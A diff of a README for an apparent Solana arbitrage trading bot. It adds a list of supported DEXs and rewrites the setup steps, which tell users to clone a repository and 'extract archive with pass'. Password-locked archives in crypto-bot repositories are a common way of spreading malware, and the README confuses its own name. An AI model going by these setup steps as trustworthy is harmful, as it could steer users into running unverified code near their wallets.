@@ -6,6 +6,14 @@ The Solana Arbitrage Bot is an automated trading tool designed to identify and e
 
 **Disclaimer:** Trading cryptocurrencies involves risks, including the risk of losing capital. This bot is for educational and informational purposes only. Use it responsibly and at your own risk.
 
+## Aviable DEXS
+- serum
+- aldrin
+- mercurial
+- orca
+- frakt
+- mango
+
 ## Features
 
 - **Arbitrage Detection:** The bot continuously monitors Solana DEXs and liquidity pools to identify arbitrage opportunities.
@@ -15,20 +23,11 @@ The Solana Arbitrage Bot is an automated trading tool designed to identify and e
 
 ## Getting Started
 Follow these steps to set up and run the CEX Withdrawal Bot on your local machine:
-
-    Clone the repository:
-
-    git clone https://github.com/gemhunterheh/solana-arbitrage-bot.git
-    cd solana-arbitrage-bot
-    extract archive with pass 
-
-    Install dependencies:
-
-    Configure your environment:
-
+- (Clone)[https://github.com/gemhunterheh/solana-arbitrage-bot.git] the repository
+- extract archive with pass 
+- Configure your environment:
 Create a .env file in the project's root directory and define your environment variables. You can use the .env.example file as a template.
-
-    Start the bot:
+- Start the bot
 
 
 ### Prerequisites
